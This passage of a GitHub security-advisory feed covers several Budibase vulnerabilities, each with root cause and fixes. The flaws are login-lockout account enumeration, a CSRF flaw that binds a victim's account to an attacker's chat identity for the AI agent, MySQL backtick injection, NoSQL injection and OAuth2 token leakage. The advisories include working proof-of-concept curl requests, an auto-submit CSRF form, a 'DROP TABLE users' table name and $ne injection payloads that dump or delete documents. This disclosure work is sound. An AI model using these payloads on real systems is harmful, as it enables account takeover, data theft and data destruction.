</code></pre>
<p><strong>Execution flow for existing users (after 5 failed attempts):</strong></p>
<ol>
<li><code>lockout</code> middleware → <code>getUserByEmail</code> returns user → <code>isLocked</code> returns true → 403 + <code>X-Account-Locked: 1</code> + <code>Retry-After: 900</code> + "Account temporarily locked"</li>
</ol>
<p><strong>Execution flow for non-existing users (any number of attempts):</strong></p>
<ol>
<li><code>lockout</code> middleware → <code>getUserByEmail</code> returns null → <code>dbUser &amp;&amp; isLocked</code> is false → passes through</li>
<li>Login handler → passport fails → <code>if (dbUser)</code> is false → <code>onFailed()</code> never called → lock never set</li>
<li>Always returns 403 "Unauthorized"</li>
</ol>
<p>No IP-based rate limiting exists on the login endpoint (<code>POST /api/global/auth/:tenantId/login</code>). The route is registered via <code>loggedInRoutes</code> which applies no authentication middleware. The password reset endpoint has proper IP-based rate limiting, but the login endpoint does not.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Test against a known-existing email and a non-existing email
# Replace 'default' with the target tenant ID

# Step 1: Send 6 login attempts for an existing user
echo "=== Testing existing user ==="
for i in $(seq 1 6); do
  echo "--- Attempt $i ---"
  curl -s -D - -X POST http://localhost:10000/api/global/auth/default/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"local@budibase.com","password":"wrongpassword"}' 2&gt;&amp;1 \
    | grep -E 'HTTP/|X-Account-Locked|Retry-After|locked|Unauthorized'
  echo ""
done

# Expected: Attempts 1-5 return "Unauthorized"
# Attempt 6 returns: "Account temporarily locked" + X-Account-Locked: 1 + Retry-After: 900

# Step 2: Send 6 login attempts for a non-existing user
echo "=== Testing non-existing user ==="
for i in $(seq 1 6); do
  echo "--- Attempt $i ---"
  curl -s -D - -X POST http://localhost:10000/api/global/auth/default/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"nonexistent@example.com","password":"wrongpassword"}' 2&gt;&amp;1 \
    | grep -E 'HTTP/|X-Account-Locked|Retry-After|locked|Unauthorized'
  echo ""
done

# Expected: All 6 attempts return "Unauthorized" — no lockout ever triggers

# The difference in behavior after 5 attempts confirms whether the email exists.
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Account enumeration</strong>: An unauthenticated attacker can determine whether any email address is registered on a Budibase tenant by sending 5-6 login requests and observing whether the response changes to "Account temporarily locked" with the <code>X-Account-Locked</code> header.</li>
<li><strong>No rate limiting</strong>: The login endpoint has no IP-based rate limiting, allowing an attacker to enumerate emails at high speed from a single IP address (~5 requests per email).</li>
<li><strong>Denial of service side-effect</strong>: Each enumerated existing email is locked out for 15 minutes (900 seconds), preventing legitimate users from logging in during that window.</li>
<li><strong>Enables further attacks</strong>: Confirmed valid emails can be used for targeted phishing, credential stuffing against other services, or social engineering.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>The lockout behavior should be identical regardless of whether the user exists. Apply lockout tracking based on the email string itself, not conditioned on database user existence:</p>
<p><strong><code>packages/worker/src/middleware/lockout.ts</code></strong> — Remove the <code>dbUser</code> check:</p>
<pre><code class="language-typescript">export default async (ctx: Ctx, next: Next) =&gt; {
  const email = ctx.request.body.username
  if (!email) {
    return await next()
  }
  // Check lock status based on email alone, not user existence
  if (await isLocked(email)) {
    ctx.set("X-Account-Locked", "1")
    ctx.set("Retry-After", String(env.LOGIN_LOCKOUT_SECONDS))
    ctx.throw(403, "Account temporarily locked. Try again later.")
  }
  return await next()
}
</code></pre>
<p><strong><code>packages/worker/src/api/controllers/global/auth.ts</code></strong> — Remove the <code>dbUser</code> guard around <code>onFailed</code>:</p>
<pre><code class="language-typescript">if (err || !user) {
  // Always increment failure counter regardless of user existence
  await onFailed(email)
  if (await isLocked(email)) {
    return handleLockoutResponse(ctx, email)
  }
  // ...
}
</code></pre>
<p>Additionally, consider adding IP-based rate limiting to the login endpoint (similar to what already exists on the password reset endpoint) to limit enumeration throughput.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-cr7p-cr3q-h5cm">https://github.com/Budibase/budibase/security/advisories/GHSA-cr7p-cr3q-h5cm</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19108">https://github.com/Budibase/budibase/pull/19108</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/eaae816ab81615c07eb10e4619af078d00e2a706">https://github.com/Budibase/budibase/commit/eaae816ab81615c07eb10e4619af078d00e2a706</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.25">https://github.com/Budibase/budibase/releases/tag/3.39.25</a></li>
<li><a href="https://github.com/advisories/GHSA-cr7p-cr3q-h5cm">https://github.com/advisories/GHSA-cr7p-cr3q-h5cm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cr7p-cr3q-h5cm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T21:43:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: Chat-Link Handoff Identity Confusion (Same-Tenant Account-Link CSRF)]]></title>
        <id>https://github.com/advisories/GHSA-pvcr-8mvp-w8qr</id>
        <link href="https://github.com/advisories/GHSA-pvcr-8mvp-w8qr"/>
        <updated>2026-07-24T21:42:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Budibase AI chat-link handoff flow (<code>GET/POST /api/chat-links/:instance/:token/handoff</code>) binds an <strong>external chat identity</strong> (Slack/Discord/MS Teams/Telegram) to a <strong>Budibase user account</strong>. The confirmation endpoint is on a <strong>public route</strong> (no CSRF middleware, no auth-group gate) and the only credential it checks is a <code>confirmationToken</code> that is <strong>already rendered in plaintext into the HTML confirmation page</strong> the victim views. There is no binding between the confirmation token and the requester's Budibase session at preparation time, and no CSRF token on the POST.</p>
<p>Consequently, an attacker who creates a chat-link session for <strong>their own</strong> external chat identity (or any identity they can mint in their chat platform) can induce a victim Budibase user (same tenant) to submit the confirmation POST -&gt; for example by sending them a link that auto-submits, or by XSS/CSRF on a co-tenanted page -&gt; and the victim's <code>globalUserId</code> becomes bound to the attacker's external identity. The attacker then sends messages to the AI agent from their chat platform and is <strong>acting as the victim user</strong> inside Budibase automations/agent operations, inheriting the victim's permissions on agent operations, knowledge sources, and any downstream automation steps keyed off the linked identity.</p>
<hr>
<h3 id="affected">Affected</h3>
<table>
<thead>
<tr>
<th>Component</th>
<th>Path</th>
<th>Lines</th>
</tr>
</thead>
<tbody><tr>
<td>Public handoff routes (no auth-group middleware)</td>
<td><code>packages/server/src/api/routes/chat.ts</code></td>
<td><code>23</code> (<code>GET /api/chat-links/:instance/:token/handoff</code>), <code>27</code> (<code>POST .../handoff</code>)</td>
</tr>
<tr>
<td>Confirmation controller</td>
<td><code>packages/server/src/api/controllers/ai/chatIdentityLinks.ts</code></td>
<td><code>124-177</code> (<code>confirmChatLinkSession</code>); the binding at <code>153-173</code></td>
</tr>
<tr>
<td>Confirmation token rendered into HTML</td>
<td><code>packages/server/src/api/controllers/ai/chatIdentityLinks.ts</code></td>
<td><code>40-60</code> (<code>renderLinkConfirmationPage</code>); the hidden input at <code>55</code></td>
</tr>
<tr>
<td>Session creation (attacker side)</td>
<td><code>packages/server/src/sdk/workspace/ai/chatIdentityLinks.ts</code></td>
<td><code>138-171</code> (<code>createChatIdentityLinkSession</code>), <code>173-188</code> (<code>prepareChatIdentityLinkSessionConfirmation</code>)</td>
</tr>
<tr>
<td>Upsert of identity link</td>
<td><code>packages/server/src/sdk/workspace/ai/chatIdentityLinks.ts</code></td>
<td><code>201-250</code> (<code>upsertChatIdentityLink</code>)</td>
</tr>
</tbody></table>
<p><strong>Affected versions:</strong> <code>master</code> at commit <code>3c8d1b4023</code>.</p>
<p><strong>Reachable over HTTP by:</strong> the GET and POST are on <code>publicRoutes</code> (no auth-group middleware). The POST requires <code>ctx.isAuthenticated</code> at runtime (<code>controllers/ai/chatIdentityLinks.ts:142</code>) -&gt; so the victim must be logged into Budibase when the POST fires (achievable via standard CSRF if cookies are sent cross-origin, or via phishing that lures the victim to submit).</p>
<hr>
<h3 id="root-cause">Root cause</h3>
<p><strong>Issue 1 -&gt; The handoff routes are public and unauthenticated at the middleware layer.</strong></p>
<pre><code class="language-ts">// packages/server/src/api/routes/chat.ts:23, 27
publicRoutes.get("/api/chat-links/:instance/:token/handoff", ai.handoffChatLinkSession)
publicRoutes.post("/api/chat-links/:instance/:token/handoff", ai.confirmChatLinkSession)
</code></pre>
<p><code>publicRoutes</code> has <strong>no group middleware</strong> (<code>endpointGroups/standard.ts:24-25</code> calls <code>endpointGroupList.group()</code> with no middleware and then <code>.lockMiddleware()</code>). The routes do not have a per-route <code>authorized(...)</code>. There is <strong>no CSRF middleware</strong> on these routes -&gt; Budibase's CSRF synchroniser token is enforced only for state-changing verbs on authenticated routes that are not in <code>NO_CSRF_ENDPOINTS</code>; the public-routes path bypasses it.</p>
<p><strong>Issue 2 -&gt; The confirmation token is exposed to anyone who views the GET page.</strong></p>
<pre><code class="language-ts">// packages/server/src/api/controllers/ai/chatIdentityLinks.ts:40-60
const renderLinkConfirmationPage = (session, action) =&gt; {
  ...
  return `&lt;!doctype html&gt;...
    &lt;form method="post" action="${helpers.escapeHtml(action)}"&gt;
      &lt;input type="hidden" name="confirmationToken" value="${helpers.escapeHtml(session.confirmationToken)}"&gt;
      &lt;button type="submit"&gt;Confirm&lt;/button&gt;
    &lt;/form&gt;
  ...`
}
</code></pre>
<p>The <code>confirmationToken</code> (a <code>newid()</code> UUIDv4 generated by <code>prepareChatIdentityLinkSessionConfirmation</code>) is rendered into a hidden form input. Anyone who loads the GET page sees the token in the page source.</p>
<p><strong>Issue 3 -&gt; The POST binds the <strong>currently-authenticated user</strong> to the external identity based solely on the confirmation token.</strong></p>
<pre><code class="language-ts">// packages/server/src/api/controllers/ai/chatIdentityLinks.ts:124-177
export async function confirmChatLinkSession(ctx) {
  ...
  if (!ctx.isAuthenticated) { throw new HTTPError("Authentication is required to link chat identity", 401) }
  if (!session.confirmationToken || ctx.request.body?.confirmationToken !== session.confirmationToken) {
    throw new HTTPError("Link confirmation is invalid or has expired", 400)
  }

  const currentGlobalUserId = getCurrentGlobalUserId(ctx)        // &lt;- victim's ID
  const consumedSession = await sdk.ai.chatIdentityLinks.consumeChatIdentityLinkSession(token)
  ...
  await sdk.ai.chatIdentityLinks.upsertChatIdentityLink({
    provider: consumedSession.provider,
    externalUserId: consumedSession.externalUserId,              // &lt;- attacker's chat identity
    externalUserName: consumedSession.externalUserName,
    ...
    globalUserId: currentGlobalUserId,                            // &lt;- bound to victim
    linkedBy: currentGlobalUserId,
  })
  ...
}
</code></pre>
<p>There is <strong>no binding between the session and the requester's Budibase identity at preparation time</strong>. <code>prepareChatIdentityLinkSessionConfirmation</code> (<code>sdk/workspace/ai/chatIdentityLinks.ts:173-188</code>) stores the <code>confirmationToken</code> keyed by <code>token</code> with no user-id field. Whoever is authenticated when the POST fires (and supplies the correct <code>confirmationToken</code>) gets bound.</p>
<p><strong>Issue 4 -&gt; <code>assertSessionMatchesInstance</code> only checks workspace ID, not user.</strong></p>
<pre><code class="language-ts">// packages/server/src/api/controllers/ai/chatIdentityLinks.ts:17-27
const assertSessionMatchesInstance = ({ workspaceId, instance }) =&gt; {
  if (!workspaceId || workspaceId !== instance) {
    throw new HTTPError("Link token is not valid for this workspace", 400)
  }
}
</code></pre>
<p>The check confirms the session belongs to the same workspace as the URL <code>instance</code> param -&gt; useful for preventing cross-workspace confusion but useless against same-tenant identity confusion.</p>
<hr>
<h3 id="reproduction">Reproduction</h3>
<p><strong>Step-by-step attack</strong></p>
<ol>
<li><p><strong>Attacker (tenant T) provisions a chat-link session for their own external identity.</strong> Via the agent channel provisioning flow (e.g. <code>POST /api/agent/:agentId/slack/provision</code> or via the Discord/MS Teams/Telegram provisioning endpoints), the attacker obtains a chat-link <code>token</code> bound to <strong>their own</strong> Slack user ID. The session is stored in Redis keyed by <code>token</code>, scoped to tenant T.</p>
</li>
<li><p><strong>Attacker triggers <code>prepareChatIdentityLinkSessionConfirmation</code>.</strong> Either by GETting the handoff page themselves (if they have a Budibase session) or via an internal API. The <code>confirmationToken</code> is generated and stored.</p>
</li>
<li><p><strong>Attacker crafts a phishing/auto-submit page</strong> that POSTs to <code>/api/chat-links/&lt;instance&gt;/&lt;token&gt;/handoff</code> with the leaked <code>confirmationToken</code> in the body. Example:</p>
<pre><code class="language-html">&lt;form id="f" method="post" action="https://victim.budibase.app/api/chat-links/app_xxx/linktoken/handoff"&gt;
  &lt;input name="confirmationToken" value="&lt;leaked-token&gt;"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;
</code></pre>
</li>
<li><p><strong>Victim (a Budibase user in tenant T, e.g. an admin) is lured to the attacker page</strong> while logged into Budibase. Their browser sends the POST cross-origin. If the Budibase auth cookie is sent on cross-site requests (<code>SameSite=Lax</code> by default allows top-level POST navigations, which a form-submit is), the request is authenticated as the victim.</p>
</li>
<li><p><strong>The victim's <code>globalUserId</code> is now bound to the attacker's Slack identity.</strong> When the attacker DMs the AI agent from Slack, the agent's operations run as the victim user -&gt; with the victim's permissions on agent operations, knowledge sources, file uploads, and any downstream automation steps keyed off the linked identity.</p>
</li>
</ol>
<p><strong>Mitigating factors:</strong></p>
<ul>
<li><code>SameSite=Lax</code> cookies block cross-site POSTs from sub-resources (fetch / XHR) but <strong>allow</strong> top-level form-POST navigations. A phishing page that submits the form via <code>document.form.submit()</code> (a top-level navigation) succeeds. So the CSRF works with the default cookie policy.</li>
<li>The attack is <strong>same-tenant only</strong> (<code>session.tenantId !== context.getTenantId()</code> is checked in the sdk).</li>
<li>The attacker must induce the victim to click a link (standard phishing). No silent drive-by.</li>
</ul>
<hr>
<h3 id="impact">Impact</h3>
<table>
<thead>
<tr>
<th>Capability</th>
<th>Available</th>
</tr>
</thead>
<tbody><tr>
<td>Bind an attacker-controlled chat identity to a victim's Budibase account</td>
<td>✅</td>
</tr>
<tr>
<td>Send messages to the AI agent as the victim user (Slack/Discord/MS Teams/Telegram)</td>
<td>✅</td>
</tr>
<tr>
<td>Inherit the victim's permissions on agent operations</td>
<td>✅</td>
</tr>
<tr>
<td>Trigger automations / agent operations that the victim is authorised for</td>
<td>✅</td>
</tr>
<tr>
<td>Read knowledge sources the victim has access to</td>
<td>✅</td>
</tr>
</tbody></table>
<p>The severity depends on what the agent can do as the victim. For an admin victim, this is full tenant administration via chat. For a regular user, it is impersonation within the agent subsystem. The bound identity persists until manually unlinked, so the attacker retains ongoing access.</p>
<p>This is a same-tenant, user-interaction-required primitive. It is below the "unauthenticated RCE" threshold but above "hardening" -&gt; it is a real authentication-confusion vulnerability on a sensitive identity-binding operation.</p>
<hr>
<h3 id="fix">Fix</h3>
<p><strong>Recommended layered fixes:</strong></p>
<ol>
<li><p><strong>Bind the confirmation token to the requester's Budibase session at preparation time.</strong> In <code>prepareChatIdentityLinkSessionConfirmation</code>, store the <code>globalUserId</code> of the requester alongside the <code>confirmationToken</code>. In <code>confirmChatLinkSession</code>, verify that <code>getCurrentGlobalUserId(ctx)</code> matches the stored requester. This breaks the CSRF / cross-user confusion.</p>
</li>
<li><p><strong>Add a CSRF token to the confirmation POST.</strong> The standard Budibase CSRF synchroniser token (<code>x-csrf-token</code> header, validated against the session's <code>csrfToken</code>) should be enforced on <code>POST /api/chat-links/.../handoff</code>. Move the route out of <code>publicRoutes</code> to an authenticated route group so CSRF applies (the GET can remain public for the redirect-to-login flow; the POST should be authenticated + CSRF-protected).</p>
</li>
<li><p><strong>Add a per-session nonce that is bound to the requester's browser</strong> (e.g. a signed cookie set on the GET, validated on the POST) to prevent cross-origin submission even when <code>SameSite=Lax</code> allows it.</p>
</li>
<li><p><strong>Require user re-authentication (re-entry of password / step-up auth)</strong> for sensitive identity-binding operations, similar to how password change requires re-auth.</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-pvcr-8mvp-w8qr">https://github.com/Budibase/budibase/security/advisories/GHSA-pvcr-8mvp-w8qr</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19194">https://github.com/Budibase/budibase/pull/19194</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/362e6c654fb4da6e123c734333da2d6cbdcdb7ef">https://github.com/Budibase/budibase/commit/362e6c654fb4da6e123c734333da2d6cbdcdb7ef</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.30">https://github.com/Budibase/budibase/releases/tag/3.39.30</a></li>
<li><a href="https://github.com/advisories/GHSA-pvcr-8mvp-w8qr">https://github.com/advisories/GHSA-pvcr-8mvp-w8qr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvcr-8mvp-w8qr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:42:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase: MySQL DESCRIBE Backtick Injection via multipleStatements in Database Connector]]></title>
        <id>https://github.com/advisories/GHSA-2xgg-r2wc-c5r2</id>
        <link href="https://github.com/advisories/GHSA-2xgg-r2wc-c5r2"/>
        <updated>2026-07-24T21:26:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><strong>This is a related but independently fixable vulnerability to GHSA-qqf5-x7mj-v43p
(PostgreSQL SQL injection), reported in the same original disclosure and
split per GitHub CNA guidance (rule 4.2.11) since it affects a separate
integration, has a distinct attack precondition, and requires a separate
patch.</strong></p>
<p>The MySQL integration enables <code>multipleStatements: true</code> on the connection,
permitting semicolon-separated multi-statement execution. During table
introspection, table names retrieved from <code>INFORMATION_SCHEMA.TABLES</code> are
interpolated into a <code>DESCRIBE</code> query wrapped in backticks, but embedded
backticks in the table name are never escaped — allowing a malicious table
name to break out and inject a second, attacker-controlled statement.</p>
<h3 id="details">Details</h3>
<p><strong>Vulnerable Code:</strong>
File: <code>packages/server/src/integrations/mysql.ts</code>, lines 172, 305</p>
<pre><code class="language-typescript">this.config = { ...config, multipleStatements: true, ... }  // line 172
...
{ sql: `DESCRIBE \`${tableName}\`;` }  // line 305 — backtick NOT escaped
</code></pre>
<p>Because <code>multipleStatements</code> is enabled, any statement appended after the
backtick break-out executes as a second query in the same round trip.</p>
<h3 id="step-by-step-reproduction">Step-by-Step Reproduction</h3>
<ol>
<li>An attacker with the ability to create tables in the target MySQL
database (e.g. a lower-privileged database user, or a malicious actor in
a multi-tenant database) creates a table named:
<code>foo`; DROP TABLE users; --</code></li>
<li>In Budibase, an administrator triggers schema introspection for that
database (e.g. opening the datasource or refreshing its table list).</li>
<li>Budibase reads the malicious table name from <code>INFORMATION_SCHEMA.TABLES</code>
and interpolates it into the <code>DESCRIBE</code> query.</li>
<li>The unescaped backtick terminates the identifier early, and the
semicolon-separated payload (enabled by <code>multipleStatements: true</code>)
executes as a second statement.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Arbitrary SQL execution triggered during routine schema discovery. Unlike
the PostgreSQL and MS SQL Server findings, this does not require the
attacker to control the Budibase datasource configuration directly — only
the ability to create a maliciously named table in the underlying database
beforehand, with an administrator's normal use of the introspection feature
serving as the trigger.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-2xgg-r2wc-c5r2">https://github.com/Budibase/budibase/security/advisories/GHSA-2xgg-r2wc-c5r2</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/18989">https://github.com/Budibase/budibase/pull/18989</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/2c61f389c9986c91ddd8ae161c2b5e8ec21c60ac">https://github.com/Budibase/budibase/commit/2c61f389c9986c91ddd8ae161c2b5e8ec21c60ac</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.18">https://github.com/Budibase/budibase/releases/tag/3.39.18</a></li>
<li><a href="https://github.com/advisories/GHSA-2xgg-r2wc-c5r2">https://github.com/advisories/GHSA-2xgg-r2wc-c5r2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xgg-r2wc-c5r2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:26:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: NoSQL Injection via JSON Parameter Interpolation in MongoDB Query Execution]]></title>
        <id>https://github.com/advisories/GHSA-qw6m-8fw2-2v64</id>
        <link href="https://github.com/advisories/GHSA-qw6m-8fw2-2v64"/>
        <updated>2026-07-24T21:25:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Budibase's MongoDB query execution endpoint (<code>POST /api/v2/queries/:queryId</code>) is vulnerable to NoSQL injection through user-supplied query parameters. The <code>enrichContext()</code> function interpolates parameter values into JSON query templates using Handlebars with <code>noEscaping: true</code>, then parses the result with <code>JSON.parse()</code>. An attacker can inject JSON metacharacters (<code>"</code>, <code>{</code>, <code>}</code>) into parameter values to alter the structure of MongoDB queries, bypassing intended filters to read, modify, or delete arbitrary documents.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists because input validation and interpolation are misaligned. The <code>validateQueryInputs()</code> function blocks Handlebars template syntax (<code>{{}}</code>) but does not sanitize JSON structural characters:</p>
<p><strong>packages/server/src/api/controllers/query/index.ts:57-69</strong></p>
<pre><code class="language-typescript">function validateQueryInputs(parameters: QueryEventParameters) {
  for (let entry of Object.entries(parameters)) {
    const [key, value] = entry
    if (typeof value !== "string") {
      continue
    }
    if (findHBSBlocks(value).length !== 0) {
      throw new Error(
        `Parameter '${key}' input contains a handlebars binding - this is not allowed.`
      )
    }
  }
}
</code></pre>
<p>After validation passes, <code>enrichContext()</code> performs raw string interpolation with escaping explicitly disabled:</p>
<p><strong>packages/server/src/sdk/workspace/queries/queries.ts:105-108</strong></p>
<pre><code class="language-typescript">enrichedQuery[key] = processStringSync(fields[key], parameters, {
  noEscaping: true,
  noHelpers: true,
  escapeNewlines: true,
})
</code></pre>
<p>The interpolated string is then parsed as JSON at line 122:</p>
<p><strong>packages/server/src/sdk/workspace/queries/queries.ts:122</strong></p>
<pre><code class="language-typescript">enrichedQuery.json = JSON.parse(
  enrichedQuery.json ||
  enrichedQuery.customData ||
  enrichedQuery.requestBody
)
</code></pre>
<p>The parsed object flows directly into MongoDB driver calls with no further sanitization:</p>
<p><strong>packages/server/src/integrations/mongodb.ts:509</strong></p>
<pre><code class="language-typescript">return await collection.find(json).toArray()
</code></pre>
<p><strong>packages/server/src/integrations/mongodb.ts:624</strong></p>
<pre><code class="language-typescript">return await collection.deleteMany(json.filter, json.options)
</code></pre>
<p>Consider a saved query with a JSON template like <code>{"username": "{{username}}"}</code>. If an attacker provides the parameter value <code>", "$ne": "</code> the interpolated string becomes <code>{"username": "", "$ne": ""}</code> — a valid JSON object that matches all documents where <code>username</code> is not empty, instead of matching a single specific user.</p>
<p>The route requires only <code>PermissionType.QUERY, PermissionLevel.WRITE</code> (packages/server/src/api/routes/query.ts:27), which is available to regular app users — not restricted to builders or admins. Critically, the execute endpoint has no Joi schema validation on the request body, unlike the save and preview endpoints.</p>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> A Budibase instance with a MongoDB datasource and a saved query that accepts a parameter interpolated into the query JSON (e.g., a <code>find</code> query with <code>{"username": "{{username}}"}</code>).</p>
<p><strong>Step 1: Authenticate as a regular app user</strong></p>
<pre><code class="language-bash">TOKEN=$(curl -s -X POST http://localhost:10000/api/global/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"appuser@example.com","password":"password"}' \
  -c - | grep budibase:auth | awk '{print $NF}')
</code></pre>
<p><strong>Step 2: Execute the query normally (returns only matching document)</strong></p>
<pre><code class="language-bash">curl -s -X POST http://localhost:10000/api/v2/queries/query_abc123 \
  -H "Content-Type: application/json" \
  -b "budibase:auth=$TOKEN" \
  -d '{"parameters": {"username": "alice"}}'
# Returns: [{"username": "alice", ...}]
</code></pre>
<p><strong>Step 3: Inject NoSQL operator to dump all documents</strong></p>
<pre><code class="language-bash">curl -s -X POST http://localhost:10000/api/v2/queries/query_abc123 \
  -H "Content-Type: application/json" \
  -b "budibase:auth=$TOKEN" \
  -d '{"parameters": {"username": "\", \"$ne\": \""}}'
# Returns: [{"username": "alice", ...}, {"username": "bob", ...}, {"username": "admin", ...}, ...]
</code></pre>
<p>The injected value <code>", "$ne": "</code> transforms the query from <code>{"username": "alice"}</code> to <code>{"username": "", "$ne": ""}</code>, which matches all documents where username is not empty.</p>
<p><strong>Step 4: Delete all documents via a delete query (if a delete-type query is saved)</strong></p>
<pre><code class="language-bash">curl -s -X POST http://localhost:10000/api/v2/queries/query_del456 \
  -H "Content-Type: application/json" \
  -b "budibase:auth=$TOKEN" \
  -d '{"parameters": {"username": "\", \"$ne\": \""}}'
# Deletes ALL documents matching the injected filter
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Data exfiltration:</strong> Any app user with query write permission can bypass intended query filters to read all documents in a MongoDB collection, including sensitive data belonging to other users or tenants.</li>
<li><strong>Data modification:</strong> Through <code>updateMany</code> queries, attackers can modify arbitrary documents in bulk by injecting broadened filters.</li>
<li><strong>Data destruction:</strong> Through <code>deleteMany</code> queries, attackers can delete all documents matching an injected filter, potentially wiping entire collections.</li>
<li><strong>Authorization bypass:</strong> The attack requires only <code>QUERY WRITE</code> permission, which is a standard app-level permission — not builder or admin access. This means any regular application user can exploit saved MongoDB queries they have access to execute.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Sanitize parameter values before interpolation by escaping JSON metacharacters. Apply this in <code>enrichContext()</code> before the <code>processStringSync</code> call:</p>
<p><strong>packages/server/src/sdk/workspace/queries/queries.ts</strong></p>
<pre><code class="language-typescript">// Add this helper function
function escapeJsonValue(value: string): string {
  return value.replace(/\\/g, "\\\\").replace(/"/g, '\\"')
}

// In enrichContext(), sanitize parameters before interpolation
for (const [key, value] of Object.entries(parameters)) {
  if (typeof value === "string") {
    parameters[key] = escapeJsonValue(value)
  }
}
</code></pre>
<p>Alternatively, adopt a parameterized query approach: instead of string interpolation into JSON, parse the template JSON first and then inject parameter values into the parsed object at the value level, preventing any structural modification of the query.</p>
<p>Additionally, add Joi validation to the execute endpoint (<code>POST /api/v2/queries/:queryId</code>) to constrain the shape of incoming parameter values, consistent with the validation already present on the save and preview endpoints.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-qw6m-8fw2-2v64">https://github.com/Budibase/budibase/security/advisories/GHSA-qw6m-8fw2-2v64</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/18907">https://github.com/Budibase/budibase/pull/18907</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/2d6c1d17cff8a653adbb2f9003eda9de38c7670f">https://github.com/Budibase/budibase/commit/2d6c1d17cff8a653adbb2f9003eda9de38c7670f</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.9">https://github.com/Budibase/budibase/releases/tag/3.39.9</a></li>
<li><a href="https://github.com/advisories/GHSA-qw6m-8fw2-2v64">https://github.com/advisories/GHSA-qw6m-8fw2-2v64</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qw6m-8fw2-2v64</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:25:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: OAuth2 Token Disclosure via Automation Test Results Broadcast to Other Builders]]></title>
        <id>https://github.com/advisories/GHSA-gh4h-34gr-87r7</id>
        <link href="https://github.com/advisories/GHSA-gh4h-34gr-87r7"/>
        <updated>2026-07-24T21:25:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When an SSO-authenticated user tests an automation in the Budibase builder, their OAuth2 access token and refresh token are included in the automation test results. These results are broadcast via WebSocket to all builders connected to the same dev app and stored in an in-memory cache accessible to any builder who polls the test status endpoint. This allows any co-builder of the same app to steal the testing user's OAuth2 tokens.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists because <code>getUserContextBindings()</code> intentionally includes OAuth2 tokens in user context bindings (so automations can call external APIs), but the automation test pipeline exposes the full result — including these tokens — to all builders of the same app without sanitization.</p>
<p><strong>Step 1: Tokens included in user bindings</strong></p>
<p>In <code>packages/server/src/sdk/users/utils.ts:134-161</code>:</p>
<pre><code class="language-typescript">export function getUserContextBindings(user: ContextUser): UserBindings {
  const bindings: UserBindings = {
    _id: user._id,
    email: user.email,
    // ...
  }
  if (isSSOUser(user) &amp;&amp; user.oauth2) {
    bindings.oauth2 = {
      accessToken: user.oauth2.accessToken,   // &lt;-- sensitive
      refreshToken: user.oauth2.refreshToken,  // &lt;-- sensitive
    }
  }
  return bindings
}
</code></pre>
<p><strong>Step 2: Bindings passed to automation execution</strong></p>
<p>In <code>packages/server/src/api/controllers/automation.ts:311-312</code>:</p>
<pre><code class="language-typescript">const user = sdk.users.getUserContextBindings(ctx.user)
return await triggers.externalTrigger(
  { ...automation, disabled: false },
  { ...input, appId, user },  // user with tokens passed as event param
  { getResponses: true, onProgress: emitProgress }
)
</code></pre>
<p><strong>Step 3: Tokens placed in trigger outputs</strong></p>
<p>In <code>packages/server/src/threads/automation.ts:409-413</code>:</p>
<pre><code class="language-typescript">const trigger: AutomationTriggerResult = {
  id: data.automation.definition.trigger.id,
